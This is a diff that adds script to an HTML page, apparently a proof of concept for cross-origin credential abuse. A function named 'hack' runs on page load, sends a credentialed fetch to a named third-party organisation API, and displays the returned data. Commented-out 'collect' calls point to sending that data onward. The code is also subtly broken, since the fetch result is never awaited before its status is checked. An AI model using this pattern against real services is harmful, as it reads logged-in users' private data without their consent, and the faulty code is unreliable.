@@ -5,7 +5,44 @@
         <link rel="icon" href="data:;base64,iVBORw0KGgo=">
     </head>
 <body>
+    <div></div>
 <script>
+
+window.onload = () => {
+
+    async function hack() {
+        const response = fetch('https://api.usefluency.com/organisation', {
+            mode: 'cors',
+            cache: 'no-cache',
+            credentials: 'include',
+            headers: {
+                'content-type': 'application/json'
+            }
+        });
+        if (!response.ok) {
+            throw new Error(`Error: ${response.status}`);
+        }
+
+        data = await response.json();
+
+        console.log(`data: ${data}`);
+
+        return JSON.stringify(data);
+    };
+
+hack()
+.then((text) => {
+  console.log(`ok`);
+  document.querySelector('div').textContent = `ok: ${text}`;
+//   collect('ok', text);
+})
+.catch(e => {
+  console.log(`err`);
+  document.querySelector('div').textContent = `err: ${e.message}`;
+//   collect('err', e.message);
+});
+
+};
 </script>
 </body>
 </html>
